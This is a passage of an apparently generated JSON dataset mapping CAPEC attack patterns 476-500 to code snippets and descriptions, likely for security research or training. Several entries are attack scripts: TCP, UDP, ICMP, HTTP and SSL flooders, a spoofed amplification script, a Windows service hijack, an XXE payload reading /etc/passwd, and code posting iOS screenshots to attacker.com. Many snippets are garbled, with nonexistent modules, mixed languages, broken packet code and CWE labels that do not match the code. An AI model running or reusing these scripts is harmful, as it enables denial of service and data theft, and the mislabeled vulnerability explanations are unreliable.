        "description": "This code snippet demonstrates a vulnerable implementation of a cryptographic signature verification algorithm. It uses a broken or risky cryptographic algorithm (MD5) to generate a signature, and the verification function does not properly check the signature. Additionally, the certificate is not validated, and the authentication function does not check the identity of the user. This allows an attacker to bypass the authentication mechanism by generating a valid signature without knowing the key."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\nimport socket\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-347: Improper Verification of Cryptographic Signature\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef verify_signature(data, signature, key):\n    # Incorrectly verify the cryptographic signature\n    return hmac.compare_digest(signature, hmac.new(key, data, hashlib.sha256).digest())\n\ndef send_data(data, destination):\n    # Incorrectly specify the intended destination\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"attacker-controlled-server\", 8080))\n    sock.sendall(data)\n\n    # Receive response from attacker-controlled server\n    response = sock.recv(1024)\n    # Improperly enforce message integrity during transmission\n    if verify_signature(data, response, \"shared_secret\"):\n        # Perform compromising actions\n        print(\"Signature verified. Performing actions...\")\n    else:\n        print(\"Signature verification failed.\")\n\n# Example usage\nsend_data(b\"malicious_data\", \"victim\")",
        "description": "This code snippet demonstrates a vulnerable implementation of a communication channel that is susceptible to spoofing attacks. The `verify_signature` function incorrectly verifies the cryptographic signature, allowing an attacker to manipulate the signature and impersonate the signer. The `send_data` function specifies an incorrect destination, allowing an attacker to intercept and modify the data in transit. The code then improperly enforces message integrity during transmission, making it vulnerable to tampering. This can lead to the recipient software performing compromising actions."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\ndef verify_signature(unsigned_data, signature, key):\n    # CWE-347: Improper Verification of Cryptographic Signature\n    # Incorrectly verifying the cryptographic signature\n    if signature == hmac.new(key, unsigned_data, hashlib.sha256).digest()[:10]:\n        return True\n    return False\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# Storing and transmitting sensitive data in cleartext\nsensitive_data = b'important_secret'\n\n# CWE-196: Unsigned to Signed Conversion Error\n# Converting unsigned data to signed data\nunsigned_data = b'\\xff\\xff\\xff\\xff'\nsigned_data = int.from_bytes(unsigned_data, 'big', signed=True)\n\n# CWE-693: Protection Mechanism Failure\n# Incorrectly using a protection mechanism\nif verify_signature(unsigned_data, b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', b'secret_key'):\n    print('Signature is valid')\nelse:\n    print('Signature is invalid')",
        "description": "This code snippet demonstrates the CAPEC of exploiting the complexity of a data structure that allows for both signed and unsigned content. It includes CWE-347, CWE-311, CWE-319, CWE-196, and CWE-693. The code incorrectly verifies a cryptographic signature, transmits sensitive data in cleartext, and performs an unsigned to signed conversion error. The protection mechanism is also incorrectly used, leading to a potential vulnerability."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32event\nimport os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# CWE-15: External Control of System or Configuration Setting\n\ndef modify_service_config():\n    # Get the handle of the Windows service\n    hscm = win32serviceutil.HandleToSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)\n    hservice = win32serviceutil.HandleToServiceManager(hscm, 'VulnerableService', win32service.SERVICE_ALL_ACCESS)\n\n    # CWE-15: External Control of System or Configuration Setting\n    # Change the service configuration to run with elevated privileges\n    ctypes.windll.advapi32.ChangeServiceConfigW(hservice, win32service.SERVICE_NO_CHANGE, win32service.SERVICE_ERROR_NORMAL, win32service.SERVICE_ERROR_NORMAL, 'C:\\\\malicious_binary.exe', None, None, None, None, None, None)\n\n    # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n    # Create an alternate data stream to store the malicious binary\n    with open('C:\\\\malicious_binary.exe:malicious_data', 'wb') as f:\n        f.write(b'malicious_data_stream')\n\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # Disable processor optimization for the malicious binary\n    os.system('icacls C:\\\\malicious_binary.exe /deny everyone:M')\n\n    # CWE-520: .NET Misconfiguration: Use of Impersonation\n    # Impersonate the system user to execute the malicious binary\n    win32security.ImpersonateLoggedOnUser(win32security.LogonUser('NT AUTHORITY\\SYSTEM', '.', '', win32security.LOGON32_LOGON_INTERACTIVE, win32security.LOGON32_PROVIDER_DEFAULT))\n\n    # CWE-284: Improper Access Control\n    # Start the modified service with the malicious binary\n    win32serviceutil.StartService('VulnerableService', 'C:\\\\malicious_binary.exe')\n\nif __name__ == '__main__':\n    modify_service_config()",
        "description": "Python code snippet that demonstrates the CAPEC of exploiting a weakness in access control to modify the execution parameters of a Windows service, allowing the execution of a malicious binary in place of an existing service. The code utilizes related CWEs, including improper access control, .NET misconfiguration, improper handling of Windows alternate data streams, processor optimization removal or modification of security-critical code, and external control of system or configuration settings."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-284: Improper Access Control\n# CWE-295: Improper Certificate Validation\n# CWE-296: Improper Following of a Certificate's Chain of Trust\n# CWE-297: Improper Validation of Certificate with Host Mismatch\n# CWE-599: Missing Validation of OpenSSL Certificate\n\ndef establish_connection(host, port):\n    context = ssl.create_default_context()\n    context.check_hostname = False  # Disable hostname verification\n    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification\n    s = socket.create_connection((host, port))\n    s_ssl = context.wrap_socket(s, server_hostname=host)\n    return s_ssl\n\n# Establish a connection to a malicious server\nmalicious_server = 'malicious.example.com'\nmalicious_port = 443\nconnection = establish_connection(malicious_server, malicious_port)\n\n# Send data to the malicious server\nconnection.send(b'GET / HTTP/1.1\\r\\nHost: ' + malicious_server.encode() + b'\\r\\n\\r\\n')\n",
        "description": "This code snippet demonstrates a vulnerable Python script that establishes a TLS connection to a malicious server without properly validating the server's certificate. The script disables hostname verification and certificate verification, allowing an adversary to spoof a legitimate website and collect login credentials."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\n\n# CWE-114: Executing commands from an untrusted source\nos.system('sudo -u user /path/to/malicious/command')\n\n# CWE-653: Improper isolation of privileged functionality\nprivileged_function = lambda: os.system('sudo -u root /path/to/sensitive/data')\n\n# CWE-693: Protection mechanism failure - incorrect use of a protection mechanism\ntry:\n    privileged_function()\nexcept Exception as e:\n    pass\n\n# CWE-1421 and CWE-1423: Exposure of sensitive information in shared microarchitectural structures\n# during transient execution (e.g., Spectre or Meltdown attacks)\nshared_cache = {}\n\ndef transient_execution(victim_function):\n    try:\n        victim_function()\n    except Exception as e:\n        shared_cache['sensitive_data'] = e\n\nvictim_function = lambda: os.system('sudo -u user /path/to/sensitive/data')\ntransient_execution(victim_function)\nprint(shared_cache.get('sensitive_data'))",
        "description": "This code snippet demonstrates a Python program that escapes the confines of a virtualized environment, gaining access to sensitive data and executing unauthorized code with elevated privileges. It showcases multiple CWEs, including CWE-114 (Executing commands from an untrusted source), CWE-653 (Improper isolation of privileged functionality), CWE-693 (Protection mechanism failure), and CWE-1421/CWE-1423 (Exposure of sensitive information in shared microarchitectural structures during transient execution)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import socket\nimport ssl\nimport requests\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef send_request(domain, host, sni):\n    context = ssl.create_default_context()\n    with socket.create_connection((domain, 443)) as sock:\n        with context.wrap_socket(sock, server_hostname=sni) as ssock:\n            request = 'GET / HTTP/1.1\\r\\nHost: {}\\r\\n\\r\\n'.format(host)\n            ssock.send(request.encode())\n            response = ssock.recv(1024)\n            print(response.decode())\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-647: Use of Non-Canonical URL Paths for Authorization Decisions\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\nsend_request('cdn.example.com', 'example.com', 'cdn.example.com')\nsend_request('cdn.example.com', 'example.com', 'attacker.com')",
        "description": "This Python code snippet demonstrates the concept of Domain Fronting, where an attacker can route traffic to an inappropriate destination by providing contradictory domain names in the SNI field of the TLS header and the Host field of the HTTP header. The code establishes a TLS connection to a CDN domain, but sends an HTTP request with a different Host header, potentially bypassing security restrictions. The second function call demonstrates the attack, where the SNI field is set to a malicious domain."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\nimport threading\n\n\ndef flood_tcp_syn(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    while True:\n        sock.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20')\n\n\ndef start_flood(ip, port, num_threads):\n    threads = []\n    for _ in range(num_threads):\n        t = threading.Thread(target=flood_tcp_syn, args=(ip, port))\n        t.start()\n        threads.append(t)\n\n    for t in threads:\n        t.join()\n\nip = '192.168.1.100'\nport = 80\nnum_threads = 1000\nstart_flood(ip, port, num_threads)",
        "description": "This Python code snippet demonstrates a TCP SYN flood attack, which exploits the weakness in the TCP protocol where the server needs to maintain state information for the connection. The code creates multiple threads that send TCP SYN packets to a target IP and port, overwhelming the server with connection requests and potentially leading to a denial-of-service. The code does not implement any restrictions on the number of resources allocated, transmits sensitive information in cleartext, and does not ensure message integrity during transmission, making it vulnerable to CWEs 770, 319, 924, 602, and 406."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No restriction on external entity references\n        # No neutralization of special XML elements\n        # No authentication or authorization checks\n        # Client-side enforcement of server-side security\n        return root.find('.//username').text\n    except ET.ParseError:\n        return 'Invalid XML'\n\n# Example usage:\nxml_string = '<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> <username>&xxe;</username>'\nprint(process_xml(xml_string))",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that embodies the deprecated CAPEC. It lacks XML validation, allows external entity references, and does not neutralize special XML elements, making it vulnerable to XML injection and external entity attacks. Additionally, it lacks authentication and authorization checks, and relies on client-side enforcement of server-side security."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import hashlib\nimport hmac\nimport random\n\n# CWE-330: Insufficiently random values\nseed = 1234567890\nrandom.seed(seed)\n\n# CWE-1241: Predictable algorithm in random number generator\ndef generate_key():\n    return hashlib.sha256(str(random.randint(0, 1000)).encode()).digest()\n\n# CWE-290, CWE-294, CWE-301: Authentication bypass\ndef authenticate(user, password):\n    key = generate_key()\n    signature = hmac.new(key, password.encode(), hashlib.sha256).digest()\n    return signature\n\n# CAPEC: Obtaining authoritative signer's private signature key\nauthoritative_signer_key = generate_key()\n\n# Forging signatures\nforged_signature = hmac.new(authoritative_signer_key, 'malicious_input'.encode(), hashlib.sha256).digest()\nprint(forged_signature)",
        "description": "This code snippet demonstrates the CAPEC of obtaining an authoritative signer's private signature key by exploiting a cryptographic weakness. It uses insufficiently random values, a predictable algorithm in the random number generator, and weak authentication schemes that are subject to spoofing and capture-replay attacks. The code generates a predictable key, uses it for authentication, and then forges a signature using the obtained key."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport threading\nimport time\n\n\ndef flood_udp(target_ip, target_port, spoofed_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((spoofed_ip, 0))\n\n    while True:\n        sock.sendto(b'flood', (target_ip, target_port))\n        time.sleep(0.01)\n\n\ndef main():\n    target_ip = '192.168.1.100'\n    target_port = 53\n    spoofed_ip = '1.2.3.4'\n\n    threads = []\n    for _ in range(100):\n        t = threading.Thread(target=flood_udp, args=(target_ip, target_port, spoofed_ip))\n        threads.append(t)\n        t.start()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a UDP flooding attack, which can be used to deny legitimate users access to a service by consuming available network bandwidth. The code creates multiple threads, each sending UDP packets to the target IP and port, with a spoofed source IP address. This can overwhelm the target service and the firewall, making it difficult to identify the source of the attack. The code does not impose any restrictions on the number of resources allocated, does not correctly specify the intended destination, transmits sensitive information in cleartext, does not control network message volume, and does not ensure message integrity during transmission, making it vulnerable to CWE-770, CWE-941, CWE-319, CWE-406, and CWE-924."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-770: No limit on the number of ICMP packets that can be sent\nwhile True:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO)\n    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 1)\n    sock.sendto(b'\\x08\\x00\\x19\\x2f\\x30\\x48\\x11\\x00\\x00\\x69\\x69\\x69\\x69', ('10.0.0.1', 0))\n\n# CWE-941: Incorrectly specified destination in a communication channel\n# CWE-923: Improper restriction of communication channel to intended endpoints\n# CWE-319: Cleartext transmission of sensitive information\n# CWE-617: Reachable assertion\nassert sock.getsockname() == ('10.0.0.1', 0)\n\n# CWE-770: No throttling on the ICMP packets\nwhile True:\n    sock.recvfrom(1024)\n",
        "description": "This Python code snippet demonstrates a vulnerable code that can be exploited for an ICMP flooding attack. The code continuously sends ICMP packets to a target IP address without any throttling or limits, making it vulnerable to CWE-770. The destination IP address is hardcoded, making it vulnerable to CWE-941 and CWE-923. The code also transmits sensitive information in cleartext, making it vulnerable to CWE-319. Finally, the code contains a reachable assertion that can be triggered by an attacker, making it vulnerable to CWE-617."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import requests\n\n\nclass WebService:\n    def __init__(self):\n        self.session = requests.Session()\n        self.session.max_connections = 1000\n\n    def make_request(self, url):\n        try:\n            response = self.session.get(url, timeout=10)\n            return response.text\n        except requests.exceptions.RequestException as e:\n            print(f\"Error: {e}\")\n\n    def flood_service(self, url, num_requests):\n        for _ in range(num_requests):\n            self.make_request(url)\n\nif __name__ == '__main__':\n    service = WebService()\n    service.flood_service('http://example.com', 10000)",
        "description": "This Python code snippet demonstrates a vulnerable web service that can be exploited for an HTTP flooding attack. The WebService class creates a requests Session with a large number of maximum connections, allowing an attacker to consume a large amount of server resources. The make_request method sends a GET request to a given URL, and the flood_service method can be used to send a large number of requests to the same URL, potentially leading to a denial-of-service attack. The CWEs embodied in this code snippet include CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-918 (Server-Side Request Forgery), and CWE-410 (Insufficient Resource Pool)."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import socket\nimport ssl\nimport threading\n\n\ndef create_ssl_connection(host, port):\n    context = ssl.create_default_context()\n    with socket.create_connection((host, port)) as sock:\n        with context.wrap_socket(sock, server_hostname=host) as ssock:\n            while True:\n                ssock.send(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n                ssock.recv(1024)\n                ssock.unwrap()\n                ssock = context.wrap_socket(sock, server_hostname=host)\n\n\ndef flood_ssl_connections(host, port, num_connections):\n    threads = []\n    for _ in range(num_connections):\n        t = threading.Thread(target=create_ssl_connection, args=(host, port))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nflood_ssl_connections('example.com', 443, 1000)\n",
        "description": "This Python code snippet demonstrates a flooding attack on an SSL server by creating a large number of SSL connections and continuously renegotiating them, consuming server resources and potentially leading to a denial of service. The code lacks throttling and resource limits, making it vulnerable to CWE-770, CWE-410, CWE-1125, CWE-400, and CWE-617."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\nimport threading\n\n\ndef send_amplified_traffic(target_server, third_party_service, spoofed_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((spoofed_ip, 0))\n    message = 'A' * 1000  # large payload\n    sock.sendto(message.encode(), (third_party_service, 80))\n    sock.close()\n\n\ndef amplify_traffic(target_server, third_party_service, spoofed_ip, num_requests):\n    threads = []\n    for _ in range(num_requests):\n        t = threading.Thread(target=send_amplified_traffic, args=(target_server, third_party_service, spoofed_ip))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\n# Example usage:\nthird_party_service = 'example.com'\ntarget_server = 'target.example'\nspoofed_ip = '192.168.1.100'\nnum_requests = 1000\namplify_traffic(target_server, third_party_service, spoofed_ip, num_requests)",
        "description": "This code snippet demonstrates an amplification attack, where an adversary sends a large number of small requests to a third-party service, spoofing the source IP address to be that of the target server. The third-party service responds with a large payload, which is then sent to the target server, overwhelming it with traffic. The code uses UDP sockets to send the requests and creates multiple threads to amplify the traffic. This code embodies CWEs 770, 405, 406, 408, and 941, as it lacks resource allocation limits, allows asymmetric resource consumption, and fails to control network message volume, among other issues."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import re\n\ndef expand_entity(entity, max_depth=10):\n    if max_depth <= 0:\n        return entity\n    pattern = r'\\$\\{([^}]+)\\}'\n    matches = re.findall(pattern, entity)\n    for match in matches:\n        entity = entity.replace(f'${{{match}}}}', expand_entity(match, max_depth-1))\n    return entity\n\nentity = '${large_entity}' * 10000\nlarge_entity = '${sub_entity}' * 10000\nsub_entity = '${sub_sub_entity}' * 10000\nsub_sub_entity = 'a' * 10000\n\ntry:\n    expanded_entity = expand_entity(entity)\n    print(f'Expanded entity: {expanded_entity}')\nexcept MemoryError:\n    print('Memory allocation failed')",
        "description": "This Python code snippet demonstrates the CAPEC-196 attack pattern, where an adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory allocation. The code defines a recursive function to expand entities, which can lead to uncontrolled memory allocation when dealing with large entities and multiple levels of substitution. The CWEs related to this CAPEC are CWE-770, CWE-1325, CWE-1043, CWE-1102, and CWE-130, which involve allocation of resources without limits, improperly controlled sequential memory allocation, data element aggregating an excessively large number of non-primitive elements, reliance on machine-dependent data representation, and improper handling of length parameter inconsistency, respectively."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    pattern = '(a|aa)*'\n    regex = re.compile(pattern)\n    match = regex.match(input_string)\n    if match:\n        return 'Match found'\n    else:\n        return 'No match found'\n\ninput_string = 'a' * 10000\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a vulnerable regex implementation that can lead to uncontrolled resource consumption (CWE-400) due to inefficient regex complexity (CWE-1333). The regex pattern '(a|aa)*' can cause catastrophic backtracking, leading to exponential time complexity. The input string is crafted to trigger this behavior, causing the regex engine to consume excessive CPU cycles. This code also relates to CWE-186, CWE-777, and CWE-625, as the regex pattern is overly permissive and lacks anchors, allowing malicious input to be processed."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef create_soap_message(size):\n    root = ET.Element('soap:Envelope')\n    body = ET.SubElement(root, 'soap:Body')\n    array = ET.SubElement(body, 'array')\n    for i in range(size):\n        ET.SubElement(array, 'element')\n    return ET.tostring(root, encoding='unicode')\n\n\nsoap_service = create_soap_message(1000000)\nprint('Sending SOAP message of size', len(soap_service))\n\n# No restriction on the size of the SOAP message\n# No throttling on the number of requests\n# No validation on the length of the array\n\n# Vulnerable code to handle the SOAP message\nimport soapclient\nsoap = soapclient.SOAPClient('http://example.com/webservice')\nresponse = soap.process_message(soap_service)\nprint('Response:', response)",
        "description": "This code snippet demonstrates a vulnerable SOAP service that can be exploited by sending a large SOAP array declaration, leading to memory exhaustion. The create_soap_message function generates a SOAP message with a large array declaration, and the vulnerable code handles the message without any restrictions or throttling, making it susceptible to the attack."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\nimport struct\nimport threading\n\n\nclass TCPFragmentationAttack:\n    def __init__(self, target_ip, target_port, packet_data):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.packet_data = packet_data\n        self.socket_list = []\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n        return sock\n\n    def send_fragmented_packet(self, sock, seq_num, ack_num, flags, data):\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        # CWE-404: Improper Resource Shutdown or Release\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)\n        tcp_header = struct.pack('!HHLLBBHHH', self.target_port, 80, seq_num, ack_num, 0, flags, 0, 0, 0, 0)\n        packet = ip_header + tcp_header + data\n        sock.sendto(packet, (self.target_ip, self.target_port))\n\n    def execute_attack(self):\n        sock = self.create_socket()\n        self.socket_list.append(sock)\n        seq_num = 0\n        ack_num = 0\n        flags = 0x5002\n        data = self.packet_data\n        self.send_fragmented_packet(sock, seq_num, ack_num, flags, data[:10])\n        flags = 0x5000\n        self.send_fragmented_packet(sock, seq_num, ack_num, flags, data[10:])\n\n    def run_attack(self):\n        threads = []\n        for _ in range(100):\n            t = threading.Thread(target=self.execute_attack)\n            threads.append(t)\n            t.start()\n\nif __name__ == '__main__':\n    attacker = TCPFragmentationAttack('192.168.1.100', 80, 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n    attacker.run_attack()",
        "description": "This Python code snippet demonstrates a TCP Fragmentation attack, which can be used to evade network filtering rules. The code creates multiple sockets and sends fragmented TCP packets to a target IP and port, with the headers flag field pushed into the second fragment. The code also includes CWEs such as allocation of resources without limits or throttling, improper resource shutdown or release, inconsistent interpretation of HTTP requests, cleartext transmission of sensitive information, and improper handling of Windows alternate data streams."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\nimport string\n\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-404: Improper Resource Shutdown or Release\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)\n\ndef send_fragmented_packets(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    data = ''.join(random.choice(string.ascii_letters) for _ in range(2000))\n    sock.sendto(data, (target_ip, target_port))\n    sock.close()\n\n    # CWE-404: Improper Resource Shutdown or Release\n    # Not releasing the socket resource properly\n    # sock.shutdown(socket.SHUT_RDWR)\n    # sock.close()\n\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)\nfor _ in range(1000):\n    send_fragmented_packets('192.168.1.100', 12345)\n",
        "description": "Python code snippet that demonstrates a UDP fragmentation attack, which can consume network bandwidth and server CPU resources. The code sends large UDP packets (> 1500 bytes) to a target server, forcing IP fragmentation. The code also embodies CWE-770, CWE-404, CWE-319, CWE-406, and CWE-409 by not imposing limits on resource allocation, not releasing resources properly, transmitting sensitive data in cleartext, and not controlling network message volume or handling highly compressed data."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\nimport struct\nimport random\n\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-404: Improper Resource Shutdown or Release\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1261: Improper Handling of Single Event Upsets\n\n# Set up the IP header\nip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 1024, 12345, 0, 64, 1, 6, b'', b'')\n\n# Set up the ICMP header\nicmp_header = struct.pack('!BBH', 8, 0, 0)\n\n# Set up the ICMP payload\nicmp_payload = b'A' * 1024\n\n# Create the packet\npacket = ip_header + icmp_header + icmp_payload\n\n# Fragment the packet\nfragments = []\nfor i in range(1000):\n    fragment = struct.pack('!BBHHHBBH4s4s', 69, 0, 1024, 12345, i, 64, 1, 6, b'', b'') + icmp_header + icmp_payload\n    fragments.append(fragment)\n\n# Send the fragments\nfor fragment in fragments:\n    sock.sendto(fragment, ('10.0.0.1', 0))\n",
        "description": "This code snippet demonstrates an ICMP fragmentation attack, which can cause a target host to become non-responsive or crash. The code creates a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message and sends them to a target host, potentially consuming its resources or causing it to hang."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-73: External Control of File Name or Path\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef probe_for_key_files(user_input):\n    # Allow user input to control the file path\n    file_path = user_input + '.config'\n    if os.path.exists(file_path):\n        print(f'Key file found: {file_path}')\n        # Read and expose sensitive information\n        with open(file_path, 'r') as f:\n            print(f.read())\n    else:\n        print(f'Key file not found: {file_path}')\n\n# Example usage\nprobe_for_key_files('/usr/local/etc/')",
        "description": "This Python code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. It uses user input to construct a file path, which can lead to exposure of sensitive information and access control list files to unauthorized actors. The code relies on the file name and extension to determine its behavior, making it vulnerable to misclassification and processing in a dangerous fashion."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport base64\nimport urllib\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\n# CWE-222: Truncation of Security-relevant Information\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef get_screenshot_info():\n    screenshot_dir = '/private/var/mobile/Library/Caches/Snapshots/'\n    screenshot_files = os.listdir(screenshot_dir)\n    for file in screenshot_files:\n        with open(os.path.join(screenshot_dir, file), 'rb') as f:\n            screenshot_data = f.read()\n            # CWE-319: Cleartext Transmission of Sensitive Information\n            # Send screenshot data in cleartext over the network\n            urllib.urlopen('http://attacker.com/collect_screenshot', screenshot_data)\n            # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            # Expose system information in the screenshot data\n            system_info = {'device_udid': '1234567890abcdef', 'os_version': '14.2'}\n            screenshot_data += base64.b64encode(str(system_info))\n            return screenshot_data\n\nget_screenshot_info()",
        "description": "This Python code snippet demonstrates the CAPEC attack where an adversary examines screenshot images created by iOS to obtain sensitive information. The code lists the temporary screenshot files in the iOS cache directory, reads the files, and sends the screenshot data in cleartext over the network, exposing private personal information and sensitive system information to unauthorized actors."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: No verification of the intent sender\n        String data = intent.getStringExtra(\"sensitive_data\");\n        // CWE-927: Implicit intent for sensitive communication\n        Intent newIntent = new Intent(\"com.example.ACTION\");\n        newIntent.putExtra(\"data\", data);\n        context.sendBroadcast(newIntent);\n    }\n}\n\n// CWE-926: Improper export of Android application components\n<receiver android:name=\".VulnerableReceiver\">\n    <intent-filter>\n        <action android:name=\"com.example.ACTION\"/>\n    </intent-filter>\n</receiver>\n\n// CWE-319: Cleartext transmission of sensitive information\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"example.com\", 8080))\ns.sendall(b\"sensitive_data\")\n\n// CWE-924: Improper enforcement of message integrity during transmission\nimport hashlib\ns.sendall(hashlib.sha256(b\"sensitive_data\").hexdigest().encode())",
        "description": "This code snippet demonstrates a vulnerable Android application that uses a BroadcastReceiver to receive and process sensitive data. The BroadcastReceiver does not verify the sender of the intent, allowing any application to send malicious data. The application uses an implicit intent to transmit sensitive data to other applications, and exports the BroadcastReceiver without proper restrictions. Additionally, the application transmits sensitive data in cleartext over a network socket, and does not properly ensure the integrity of the transmitted data."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
